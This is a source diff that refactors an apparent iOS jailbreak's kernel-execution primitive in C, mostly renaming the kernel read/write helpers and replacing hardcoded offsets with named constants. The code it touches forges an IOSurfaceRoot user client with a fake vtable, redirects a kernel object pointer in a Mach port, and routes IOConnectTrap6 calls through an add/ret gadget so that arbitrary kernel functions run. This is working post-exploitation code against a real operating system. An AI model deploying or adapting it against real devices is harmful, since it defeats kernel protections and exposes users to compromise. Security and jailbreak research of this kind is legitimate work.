@@ -17,7 +17,7 @@ static kptr_t IOSurfaceRootUserClient_addr;
 static kptr_t fake_vtable;
 static kptr_t fake_client;
 static kmap_hdr_t zm_hdr;
-const int fake_kalloc_size = 0x1000;
+static const int fake_kalloc_size = 0x1000;
 
 #ifdef __LP64__
 #define LOG_KPTR(...) LOG("%s %llx\n", __VA_ARGS__)
@@ -25,10 +25,8 @@ const int fake_kalloc_size = 0x1000;
 #define LOG_KPTR(...) LOG("%s %x\n", __VA_ARGS__)
 #endif
 
-mach_port_t prepare_user_client()
+mach_port_t prepare_user_client(void)
 {
-    kern_return_t ret = KERN_SUCCESS;
-
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
 
     if (service == MACH_PORT_NULL) {
@@ -36,11 +34,14 @@ mach_port_t prepare_user_client()
         return MACH_PORT_NULL;
     }
 
-    mach_port_t user_client = MACH_PORT_NULL;
-    ret = IOServiceOpen(service, mach_task_self(), 0, &user_client);
-    LOG("got iosurfaceroot userclient: %x", user_client);
+    mach_port_t client = MACH_PORT_NULL;
+    kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &client);
+    if (ret != KERN_SUCCESS) {
+        LOG("Failed to successfully get IOSurfaceRoot user client");
+    }
+    LOG("IOSurfaceRoot user client is: %x", client);
 
-    return user_client;
+    return client;
 }
 
 kern_return_t init_kexecute(kptr_t zone_map, kptr_t add_ret_gadget)
@@ -57,13 +58,13 @@ kern_return_t init_kexecute(kptr_t zone_map, kptr_t add_ret_gadget)
         return KERN_FAILURE;
     }
 
-    IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + 0x68); // ipc_port->ip_kobject
+    IOSurfaceRootUserClient_addr = kread_kptr(IOSurfaceRootUserClient_port + OFFSET_IPC_PORT_IP_KOBJECT); // ipc_port->ip_kobject
     if (IOSurfaceRootUserClient_addr == 0x0) {
         LOG("failed to find address of IOSRUC obj");
         return KERN_FAILURE;
     }
 
-    kptr_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);
+    kptr_t IOSurfaceRootUserClient_vtab = kread_kptr(IOSurfaceRootUserClient_addr);
     if (IOSurfaceRootUserClient_vtab == 0x0) {
         LOG("failed to find IOSRUC vtab");
         return KERN_FAILURE;
@@ -91,20 +92,20 @@ kern_return_t init_kexecute(kptr_t zone_map, kptr_t add_ret_gadget)
     kwrite(fake_client, local_client, fake_kalloc_size);
 
     // replace the vtab with our fake one
-    wk64(fake_client + 0x0, fake_vtable);
+    kwrite_kptr(fake_client + 0x0, fake_vtable);
 
-    wk64(IOSurfaceRootUserClient_port + 0x68, fake_client); // ipc_port->ip_kobject
+    kwrite_kptr(IOSurfaceRootUserClient_port + OFFSET_IPC_PORT_IP_KOBJECT, fake_client); // ipc_port->ip_kobject
 
-    wk64(fake_vtable + (0x8 * 0xb7), add_ret_gadget + kernel_slide);
+    kwrite_kptr(fake_vtable + (sizeof(kptr_t) * OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX), add_ret_gadget + kernel_slide);
 
     // resolve zone map to set up zm_fix_addr
-    kptr_t zone_map_addr = rk64(zone_map + kernel_slide);
+    kptr_t zone_map_addr = kread_kptr(zone_map + kernel_slide);
     if (zone_map_addr == 0x0) {
         LOG_KPTR("wtf, failed to find zone map addr @ offset", zone_map + kernel_slide);
         return KERN_FAILURE;
     }
 
-    kread(zone_map_addr + 0x10, (void*)&zm_hdr, sizeof(zm_hdr));
+    kread(zone_map_addr + 0x10, (volatile void*)&zm_hdr, sizeof(zm_hdr));
 
     LOG_KPTR("zone map start:", zm_hdr.start);
     LOG_KPTR("zone map end:", zm_hdr.end);
@@ -113,10 +114,10 @@ kern_return_t init_kexecute(kptr_t zone_map, kptr_t add_ret_gadget)
     return KERN_SUCCESS;
 }
 
-void term_kexecute()
+void term_kexecute(void)
 {
     if (IOSurfaceRootUserClient_port != 0x0 && IOSurfaceRootUserClient_addr != 0x0) {
-        wk64(IOSurfaceRootUserClient_port + 0x68, IOSurfaceRootUserClient_addr); // ipc_port->ip_kobject
+        kwrite_kptr(IOSurfaceRootUserClient_port + OFFSET_IPC_PORT_IP_KOBJECT, IOSurfaceRootUserClient_addr); // ipc_port->ip_kobject
     }
 
     if (fake_vtable != 0) {
@@ -136,7 +137,7 @@ kptr_t kexecute(kptr_t addr, int n_args, ...)
 #else
         LOG("tried to kexecute on %x with %d args when kexecute is not yet set up", addr, n_args);
 #endif
-        return -1;
+        return (kptr_t)-1;
     }
 
     if (n_args > 7) {
@@ -156,10 +157,10 @@ kptr_t kexecute(kptr_t addr, int n_args, ...)
         args[0] = 0x1;
     }
 
-    wk64(fake_client + 0x40, args[0]);
-    wk64(fake_client + 0x48, addr + kernel_slide);
+    wk64(fake_client + OFFSET_FAKE_CLIENT_ARGC, args[0]);
+    wk64(fake_client + OFFSET_FAKE_CLIENT_JUMP, addr + kernel_slide);
 
-    return IOConnectTrap6(user_client, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
+    return (kptr_t)IOConnectTrap6(user_client, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
 }
 
 kptr_t zm_fix_addr(kptr_t addr)
